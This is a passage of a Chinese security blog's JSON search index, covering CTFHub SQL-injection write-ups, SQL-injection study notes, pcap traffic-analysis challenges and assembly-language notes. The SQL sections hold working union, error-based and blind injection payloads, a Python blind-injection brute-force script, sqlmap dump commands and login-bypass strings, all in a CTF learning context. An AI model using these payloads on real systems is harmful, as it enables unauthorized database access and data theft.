输入-1 union select 1,(select * from flag)#，得到flag字段的存储数据。 ","date":"2021-03-05","objectID":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/:2:0","tags":["Web安全","CTF"],"title":"CTFHub-SQL注入学习","uri":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x02 字符型注入 题目：SQL注入 字符型注入, 尝试获取数据库中的 flag 使用order by 子句快速猜解表中的列数，试出列数为2。 输入-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())#，爆表 输入-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flag')#，爆破字段 输入-1' union select 1,(select * from flag)#，得到flag字段的存储数据。 ","date":"2021-03-05","objectID":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/:3:0","tags":["Web安全","CTF"],"title":"CTFHub-SQL注入学习","uri":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x03 报错注入 输入1 union select count(),concat(database(),floor(rand(0)2))x from information_schema.columns group by x，爆出数据库为sqli。 输入1 union select count(*),concat((select table_name from information_schema.tables where table_schema=database()),floor(rand(0)*2))x from information_schema.columns group by x，报错，原因是结果返回多行数据。 使用limit子句，被用于强制 select语句返回指定的记录数。limit接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。 得到两个表名，news和flag，使用同样的方法，输入1 union select count(),concat((select column_name from information_schema.columns where table_name='flag' limit 0,1),floor(rand(0)2))x from information_schema.columns group by x，继续爆破字段名。 输入1 union select count(),concat((select flag from flag),floor(rand(0)2))x from information_schema.columns group by x，得到flag。 ","date":"2021-03-05","objectID":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/:4:0","tags":["Web安全","CTF"],"title":"CTFHub-SQL注入学习","uri":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x04 布尔盲注 输入select * from news where id=1 and if(1,sleep(4),null)发现有时延，存在注入。简单写个脚本来爆破。 import requests\rdic = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_@!#$^\u0026*()/\u003c\u003e.[]'\rurl = \"http://challenge-214ca254e588d83f.sandbox.ctfhub.com:10800/\"\rflag= ''\rfor i in range(1,10):\rfor x in dic:\rdata={\r'id':'1 and (if(substr(database(),%d,1)=\\'%s\\',sleep(4),null))' %(i,x)\r}\rtry:\rres=requests.get(url,data,timeout=4)\rexcept requests.exceptions.ReadTimeout:\rflag=flag+x\rprint(flag)\rbreak\rprint(flag) 成功得到数据库名称，继续构造语句。 输入1 and (select count(table_name) from information_schema.tables where table_schema=database())=2，得到表的数量。 修改id为1 and if(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),%d,1)=\\'%s\\',sleep(4),null)，得到可疑的表flag。继续修改成1 and if(substr((select column_name from information_schema.columns where table_name=\\'flag\\' limit 0,1),%d,1)=\\'%s\\',sleep(4),null)，得到可疑字段名flag。最后，修改为1 and if(substr((select flag from flag),%d,1)=\\'%s\\',sleep(4),null)，扩大range。得到flag。 做完发现，把题目想复杂了一丢丢，脚本可以再简化一下(下面未测试)。 import requests\rdic = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_@!#$^\u0026*()/\u003c\u003e.[]'\rurl = \"http://challenge-214ca254e588d83f.sandbox.ctfhub.com:10800/\"\rtext= 'query_success'\rflag= ''\rfor i in range(1,10):\rfor x in dic:\rdata={\r'id':'1 and substr(database(),%d,1)=\\'%s\\'' %(i,x)\r}\rres=requests.get(url,data)\rif text in res.text:\rflag=flag+x\rprint(flag)\rbreak\rprint(flag) ","date":"2021-03-05","objectID":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/:5:0","tags":["Web安全","CTF"],"title":"CTFHub-SQL注入学习","uri":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x05 时间盲注 直接用上一题的脚本，改个url就能跑出来了。 ","date":"2021-03-05","objectID":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/:6:0","tags":["Web安全","CTF"],"title":"CTFHub-SQL注入学习","uri":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x06 MySQL结构 构造-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 继续构造-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='vpkaqldokv'# 最后构造-1 union select 1,group_concat(gtlvsmcstd) from vpkaqldokv#，成功得到flag。 ","date":"2021-03-05","objectID":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/:7:0","tags":["Web安全","CTF"],"title":"CTFHub-SQL注入学习","uri":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x07 过滤空格 构造上一题类似的语句，用/**/绕过空格。-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()# 构造-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='txoypyrige'# 最后，构造-1/**/union/**/select/**/1,group_concat(affqveqsqw)/**/from/**/txoypyrige# ","date":"2021-03-05","objectID":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/:8:0","tags":["Web安全","CTF"],"title":"CTFHub-SQL注入学习","uri":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x08 Cookie注入 打开cookie，找到注入点。 修改id的value即可实现注入。 ","date":"2021-03-05","objectID":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/:9:0","tags":["Web安全","CTF"],"title":"CTFHub-SQL注入学习","uri":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x09 UA注入 打开bp，在UA构造注入语句。 ","date":"2021-03-05","objectID":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/:10:0","tags":["Web安全","CTF"],"title":"CTFHub-SQL注入学习","uri":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"0x0A Refer注入 同样使用bp构造注入语句。 ","date":"2021-03-05","objectID":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/:11:0","tags":["Web安全","CTF"],"title":"CTFHub-SQL注入学习","uri":"/2021-03-05-ctfhub-sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"},{"categories":["学习","安全技术"],"content":"\r","date":"2021-03-04","objectID":"/2021-03-04-%E5%AE%89%E5%85%A8%E7%89%9Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:0","tags":["Web安全","CTF"],"title":"安全牛SQL注入学习笔记","uri":"/2021-03-04-%E5%AE%89%E5%85%A8%E7%89%9Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x00 宽字节注入 宽字节注入用于绕过addslashes函数，常见的URL转码有：空格%20，’%27，#%23，`%5c`。 逃逸方法：1、\\前面再加一个\\；2、mysql使用GBK编码的特性， 会认为两个字符是一个汉字（前一个ascii码\u003e128） sqlmap的使用小记。 判断是否存在注入点sqlmap -u url，例如sqlmap -u http://127.0.0.1/sqli-labs/Less-1/?id=1，id参数大于两个时，记得把url用双引号引起来 sqlmap -u \"http://127.0.0.1/sqli-labs/Less-1/?id=1\u0026uid=1\" 查询所有库名sqlmap -u\u0026nbsp;url\u0026nbsp;- -dbs 查询库中的所有表名sqlmap -u\u0026nbsp;url -D 库名 - -tables 查询表中的字段 sqlmap -u url -D 库名 -T 表名 - -columns 查询字段内容 sqlmap -u url -D \u003ccode\u003e库名 -T 表名 -C 字段1，字段2…. - -dump 配合16进制时，加上--hex ","date":"2021-03-04","objectID":"/2021-03-04-%E5%AE%89%E5%85%A8%E7%89%9Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:0","tags":["Web安全","CTF"],"title":"安全牛SQL注入学习笔记","uri":"/2021-03-04-%E5%AE%89%E5%85%A8%E7%89%9Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x01 基于约束的SQL攻击 假设mysql中的某张表将用户名限制为10个字符以内，限制了插入的字符串的长度，如果插入一条的用户名为'admin 1'的数据，超出的部分会被数据库忽略掉，多出的部分被截断，新创建的admin用户对应我们而言就是可控的了。 ","date":"2021-03-04","objectID":"/2021-03-04-%E5%AE%89%E5%85%A8%E7%89%9Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:0","tags":["Web安全","CTF"],"title":"安全牛SQL注入学习笔记","uri":"/2021-03-04-%E5%AE%89%E5%85%A8%E7%89%9Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x02 报错注入 报错注入在于：count(*),rand(),floor()以及group by。rand()用于产生一个0~1的随机数。count(*)统计整个的结果，floor()向下取整。rand()函数生成0~1的函数，使用floor()函数向下取整，值是固定的“0”，我们将rand*2，得到的值就是不固定的，“0”或者“1”。group by语句用于结合聚合函数，根据一个或多个列对结果集进行分组。 公式：and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tablesgroup by x)a); 语句执行的时候会建立一个虚拟表，整个工作流程大致如下。开始查询数据时，读取数据库数据，查看虚拟表是否存在，不存在则插入新记录，存在则count(*)字段直接加。 查询前默认会建立空虚拟表，取第1条记录，执行floor(rand(0)*2)，发现结果为0(第1次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)*2)会被再计算一次，结果为1(第2次计算)，插入虚表 查询第2条记录，再次计算floor(rand(0)*2)，发现结果为1(第3次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)*2)不会被计算第2次，直接count(*)+1 查询第3条记录，再次计算floor(rand(0)*2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)*2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以重复插入报错。 updatexml函数：or updatexml(1,concat(0x7e,(\u003ccode\u003e操作代码)),0)updatexml第二个参数需要的是Xpath格式的字符串。输入不符合，报错，但version()函数能够正常的执行。updatexml的最大长度是32位。 extractvalue函数：and extractvalue(1, concat(0x7e, (select \u003ccode\u003e操作代码))) extractvalue原理与updatexml类似。 exp函数：and exp(~(select * from(select \u003ccode\u003e操作代码)a)) exp()数学函数，用于计算e的x次方的函数。但是，由于数字太大是会产生溢出。这个函数会在参数大于709时溢出，报错。将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值，从而实现了报错注入。 NAME_CONST函数：select * from (select NAME_CONST(version(),1),NAME_CONST(\u003ccode\u003e\u003ccode\u003eversion(),1))a;mysql列名重复会导致报错，存在局限性，爆不了库等。 GeometryCollection函数：and geometrycollection((select * from(select * from (操作代码)a)b))GeometryCollection是由1个或多个任意类几何对象构成的几何对象。官方文档中举例的用法如下：GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))POINT(x,y) 函数,这是坐标函数，相当于X,Y坐标图上的一点。LINESTRING(x y,x y)函数,这个函数用来描述直线,两点连成的直线。mysql无法画出图形，报错。 空间数据储存函数：POLYGON:简单面polygon ()、MULTIPOINT：多点multipoint ()、MULITILINESTRING:多线multlinestring ()、MUILITIPOLYGON：多面multpolygon ()、LINESTRING:简单线linestring ()报错原理与GeometryCollection()原理相同。 join函数：and（select * from (select * from 表名 a join 表名 b using(已知的字段1，已知的字段2,……)c))在表名已知的前提下才能操作。参考：https://blog.csdn.net/weixin_46706771/article/details/112769113 bigint函数：参考https://www.cnblogs.com/lcamry/articles/5509112.html ","date":"2021-03-04","objectID":"/2021-03-04-%E5%AE%89%E5%85%A8%E7%89%9Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:0","tags":["Web安全","CTF"],"title":"安全牛SQL注入学习笔记","uri":"/2021-03-04-%E5%AE%89%E5%85%A8%E7%89%9Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x03 基于时间的盲注以及bool型的盲注 sleep(duration )函数使用说明：睡眠( 暂停) 时间为duration 参数给定的秒数，然后返回0 。若sleep() 被中断, 它会返回1。 假设表中有四条数据，id从1-4，select * from table where id=1 or sleep(1);会延时9s，select * from table where id=5 and sleep(1);会延时12s。 配合if条件触发，IF(expr1,expr2,expr3)如果expr1 是TRUE (expr1 \u003c\u003e 0 and expr1 \u003c\u003e NULL)，则IF()的返回值为expr2; 否则返回值则为expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。 截取函数 函数 作用 MID(s,n,len) 从字符串 s 的 n 位置截取长度为 len 的子字符串 RIGHT(s,n) 返回字符串 s 的后 n 个字符 LEFT(s,n) 返回字符串 s 的前 n 个字符 SUBSTR(s, start, length) 从字符串 s 的 start 位置截取长度为 length 的子字符串 SUBSTRING(s, start, length) 从字符串 s 的 start 位置截取长度为 length 的子字符串 SUBSTRING_INDEX(s, delimiter, number) 返回从字符串 s 的第 number 个出现的分隔符 delimiter 之后的子串。 如果 number 是正数，返回第 number 个字符左边的字符串。 如果 number 是负数，返回第(number 的绝对值(从右边数))个字符右边的字符串。 SUBSTRING 的其他用法：SUBSTRING(str,pos) , SUBSTRING(str FROM pos)，SUBSTRING(str FROM pos FOR len)，后两种可以绕过,的过滤。SUBSTR和MID也支持这种用法。 RLIKE、REGEXP执行字符串表达式与模式的模式匹配。语法：RLIKE\u0026nbsp;Pat_for_match这里Pat_for_match是要与表达式匹配的模式。 like 匹配注入。 配合select case when条件触发，SQL CASE 表达式是一种通用的条件表达式，类似于其它语言中的if/else 语句。 CASE WHEN conditionTHEN result\u003cbr\u003e[WHEN ...]\u003cbr\u003e[ELSE result]\u003cbr\u003eEND\r例句：select case when username='admin' THEN 'aaa' ELSE (sleep(3) ) end\u003cbr\u003efrom user; 逐字注入，能够截取字符，同时能触发延时即可。结合python的request库写脚本。 例句1：Select * from table where id = 1 and (if(substr(database(),1,1)=’’,sleep(4),null)) 例句2：Select * from table where id = 1 and (if(ascii(substr(database(),1,1))\u003c128,sleep(4),null)) 除了sleep之外的延时有以下4种： BENCHMARK(count ,expr )，BENCHMARK() 函数重复count 次执行表达式expr 。它可以被用于计算MySQL 处理表达式的速度。结果值通常为0 。例句：select benchmark(10000000,sha(1)); 笛卡尔积，AxB=A和B中每个元素的组合所组成的集合，就是连接表。例句：SELECT count(*) FROM information_schema.columnsA,information_schema.columnsB, information_schema.tablesC; GET_LOCK(str,timeout )，设法使用字符串str给定的名字得到一个锁，超时为timeout 秒。条件限制：需要两个session。例句：session A select get_lock('test',1);session B select get_lock('test',5); RLIKE REGEXP正则匹配，通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。RPAD(str,len,padstr) 用字符串 padstr对 str进行右边填补直至它的长度达到 len个字符长度，然后返回 str。如果 str的长度长于 len’，那么它将被截除到 len个字符。范例：SELECT RPAD('hi',5,'?'); -\u003e 'hi???'repeat(str,times) 复制字符串times次。 例句：select concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE'(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b' ORD()函数和ASCII()函数，返回第一个字符的ASCII码。 ","date":"2021-03-04","objectID":"/2021-03-04-%E5%AE%89%E5%85%A8%E7%89%9Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:0","tags":["Web安全","CTF"],"title":"安全牛SQL注入学习笔记","uri":"/2021-03-04-%E5%AE%89%E5%85%A8%E7%89%9Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x04 order by的注入 位运算符 ORDER BY子句对查询返回的结果按一列或多列排序。 语法格式为：ORDER BY {column_name[ASC|DESC]} [，...n] ORDER BY 语句默认按照升序对记录进行排序。 在不知道列名的情况下可以通过列的的序号来指代相应的列。但是经过测试这里无法做运算，如order=3-1和order=2是不一样的。 当orderby注入能过返回错误信息时，也可以考虑使用报错注入。 根据不同的列排序，会返回不同的结果，使用类似于bool型盲注的形式来注入，即使判断的结果与某种返回内容相关联，来实现注入，同理，在bool型注入可以的情况下，一般也能使用基于时间的盲注。 Orderby可以根据多列排序，因此注入的语句不一定限制与orderby的第一个参数，也可以通过逗号去对新的列进行注入。 ","date":"2021-03-04","objectID":"/2021-03-04-%E5%AE%89%E5%85%A8%E7%89%9Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:5:0","tags":["Web安全","CTF"],"title":"安全牛SQL注入学习笔记","uri":"/2021-03-04-%E5%AE%89%E5%85%A8%E7%89%9Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x05 insert，update和delete注入 Insert注入 例句1：insert into users (id, username, password) values (1,’user’,’passwd’); 例句2：insert into users (id, username, password)values (2, 'attacker' or updatexml(1,concat(0x7e,database()),0), ’passwd’);\u003cbr\u003e例句3：insert into users (id, username, password) values (3,database(),’passwd'); \u003cbr\u003e Update注入 例句1：update users set password = ‘password’ where id =2; 例句2：update users set password=’password' or updatexml(1,concat(0x7e,database()),0) WHERE id=2; Delete注入 例句1：delete from users where id=2; 例句2：delete from users where id=2 or updatexml(1,concat(0x7e,database()),0); ","date":"2021-03-04","objectID":"/2021-03-04-%E5%AE%89%E5%85%A8%E7%89%9Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:6:0","tags":["Web安全","CTF"],"title":"安全牛SQL注入学习笔记","uri":"/2021-03-04-%E5%AE%89%E5%85%A8%E7%89%9Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x06 desc相关注入及其他 {DESCRIBE | DESC} tbl_name[col_name| wild] DESCRIBE 或DESC查看表结构的详细信息。col_name可以是一个列名或是一个包含SQL 通配符字符“%” 和“_” 的字符串。 ` 是 MySQL 的转义符，避免和 mysql 的本身的关键字冲突，只要你不在列名、表名中使用 mysql 的保留字或中文，就不需要转义。通常用来说明其中的内容是数据库名、表名、字段名，不是关键字。 万能密码 Select * from admin where username = 'admin'# Select * from admin where username = ''+'' and password = ''+'';仅限于0开头的字符串。 Select * from admin where username = 'aaa'='' and password = 'aaa'=''; \\N,E0，.0绕过其实相当于NULL字符，参考：https://blog.csdn.net/wy_97/article/details/78085664 mysql\u003e select*from sql_test where id =\\Nunion select * from sql_test where id=2;\r+----+----------+----------+\r| id | username | password |\r+----+----------+----------+\r| 2 | test | 234 |\r+----+----------+----------+\r1 row in set (0.00 sec)\rmysql\u003e select*from sql_test where id =8E0union select * from sql_test where id=2;\r+----+----------+----------+\r| id | username | password |\r+----+----------+----------+\r| 2 | test | 234 |\r+----+----------+----------+\r1 row in set (0.00 sec)\rmysql\u003e select*from sql_test where id =8.0union select * from sql_test where id=2;\r+----+----------+----------+\r| id | username | password |\r+----+----------+----------+\r| 2 | test | 234 |\r+----+----------+----------+\r1 row in set (0.06 sec)\r———————————————— ","date":"2021-03-04","objectID":"/2021-03-04-%E5%AE%89%E5%85%A8%E7%89%9Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:7:0","tags":["Web安全","CTF"],"title":"安全牛SQL注入学习笔记","uri":"/2021-03-04-%E5%AE%89%E5%85%A8%E7%89%9Bsql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"\r","date":"2021-03-03","objectID":"/2021-03-03-ctfhub-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:0:0","tags":["Misc","CTF"],"title":"CTFHub-流量分析","uri":"/2021-03-03-ctfhub-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["学习","安全技术"],"content":"0x00 前言 菜鸡记录汇总下流量分析的学习过程。 ","date":"2021-03-03","objectID":"/2021-03-03-ctfhub-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:1:0","tags":["Misc","CTF"],"title":"CTFHub-流量分析","uri":"/2021-03-03-ctfhub-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["学习","安全技术"],"content":"0x01 MySQL流量 用wireshark打开文件进行分析。 首先观察到，用户进行了登录的尝试操作，成功后查询信息等。 追踪tcp流，发现flag。 ","date":"2021-03-03","objectID":"/2021-03-03-ctfhub-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:2:0","tags":["Misc","CTF"],"title":"CTFHub-流量分析","uri":"/2021-03-03-ctfhub-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["学习","安全技术"],"content":"0x02 Redis流量 Redis 是完全开源的，遵守 BSD 协议，是一个高性能的 key-value 数据库。 打开文件后，直接开始追踪tcp流。修改整个对话后，我们能看到用户对redis的操作，例如info返回关于 Redis 服务器的各种信息和统计数值等等，也可以发现SET的flag值。 ","date":"2021-03-03","objectID":"/2021-03-03-ctfhub-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:3:0","tags":["Misc","CTF"],"title":"CTFHub-流量分析","uri":"/2021-03-03-ctfhub-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["学习","安全技术"],"content":"0x03 MongoDB流量 MongoDB 是一个基于分布式文件存储的数据库。由 C++ 语言编写。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。MongoDB 是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。 追踪流，发现用户在执行ismaster、showPrivileges等命令，慢慢往下看。发现插入了flag的文档。 ","date":"2021-03-03","objectID":"/2021-03-03-ctfhub-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:4:0","tags":["Misc","CTF"],"title":"CTFHub-流量分析","uri":"/2021-03-03-ctfhub-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["学习","安全技术"],"content":"0x04 Data 题目：ping 也可以携带数据? 打开wireshark，发现每个响应包的data字段有一个字节不对劲。 把所有的拼接在一起，得到ctfhub{c87eb99796406ac0b}。 ","date":"2021-03-03","objectID":"/2021-03-03-ctfhub-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:5:0","tags":["Misc","CTF"],"title":"CTFHub-流量分析","uri":"/2021-03-03-ctfhub-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["学习","安全技术"],"content":"0x04 Length 题目：ping 包的大小有些奇怪 将所有ICMP数据包的Length字段取出来，转换为ASCII码值，即可得到ctfhub{acb659f023} ","date":"2021-03-03","objectID":"/2021-03-03-ctfhub-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:6:0","tags":["Misc","CTF"],"title":"CTFHub-流量分析","uri":"/2021-03-03-ctfhub-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["学习","安全技术"],"content":"0x05 LengthBinary 题目：ping 包的大小有些奇怪 打开后发现响应包的length只有106和74两种，根据题目binary可知，代表了0和1的二进制。 可以手动处理，也可以借助脚本。 import subprocess\ra=subprocess.check_output(\"tshark.exe -r icmp_len_binary.pcap -Y icmp.type==8 -T fields -e data.len\")\rb=a.split()\rs=\"\"\rres=\"\"\rfor i in b:\rif b'64' in i:\rs=s+\"1\"\rif b'32' in i:\rs=s+\"0\"\rif len(s) ==8:\rres=res+chr(int(s,2))\rs=\"\"\rprint(\"result:\"+res) ","date":"2021-03-03","objectID":"/2021-03-03-ctfhub-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:7:0","tags":["Misc","CTF"],"title":"CTFHub-流量分析","uri":"/2021-03-03-ctfhub-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["学习"],"content":"\r","date":"2021-03-01","objectID":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/:0:0","tags":["逆向"],"title":"《汇编语言》学习笔记(updating)","uri":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/"},{"categories":["学习"],"content":"oxoo 前言 在绿盟测试赛题时遇到Reverse就头大，于是购入了王爽老师的第四版《汇编语言》，从零开始学习。 ","date":"2021-03-01","objectID":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/:1:0","tags":["逆向"],"title":"《汇编语言》学习笔记(updating)","uri":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/"},{"categories":["学习"],"content":"0x01 基础知识 汇编语言有以下3类指令组成。 （1）汇编指令：机器码的助记符，有对应的机器码，汇编语言的核心。 （2）伪指令：没有对应的机器码，由编译器执行，计算机并不执行。 （3）其他符号：如+、-、*、/等，由编译器识别，没有对应的机器码。 CPU想要进行数据的读写，必须和外部器件进行下面3类信息交互。 （1）存储单元的地址（地址信息）-—到哪儿去？ （2）器件的选择，读或写的命令（控制信息）-—怎么去？ （3）读或写的数据（数据信息）-—谁去？ 内存地址空间的大小受CPU地址总线宽度的限制 ","date":"2021-03-01","objectID":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/:2:0","tags":["逆向"],"title":"《汇编语言》学习笔记(updating)","uri":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/"},{"categories":["学习"],"content":"0x02 寄存器 AX、BX、CX、DX这4个寄存器通常用来存放一般性的数据，被称为通用寄存器。AX的低8位（0-7位）构成了AL寄存器，高八位（8-15位）构成了AH寄存器。 在进行数据传送或运算时，要注意指令的两个操作对象的位数应当是一致的。 物理地址=段地址x16+偏移地址 段地址x16有一个更为常用的说法，左移4位 CS为代码段寄存器，IP为指令指针寄存器。 8086CPU的工作流程可以简要描述如下： （1）从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲器。 （2）IP=IP+所读指令的长度，从而指向下一条指令。 （3）执行指令。转到步骤（1），重复这个过程。 “jmp 段地址:偏移地址”指令的功能：用指令中给出的段地址修改CS，偏移地址修改IP。 “jmp 某一合法寄存器”指令的功能：用寄存器中的值修改IP。 ","date":"2021-03-01","objectID":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/:3:0","tags":["逆向"],"title":"《汇编语言》学习笔记(updating)","uri":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/"},{"categories":["学习"],"content":"0x03 寄存器（内存访问） 任何两个地址连续的内存单元，N号单元和N+1号单元，可以将它们看成两个内存单元，也可看成一个地址为N的字单元中的高位字节单元和低位字节单元。 “[…]“表示一个内存单元，”[…]“中的0表示内存单元的偏移地址。 如果将10000H-1FFFFH，这段空间当作栈段，初始状态栈是空的，此时，SS=1000H，SP=? 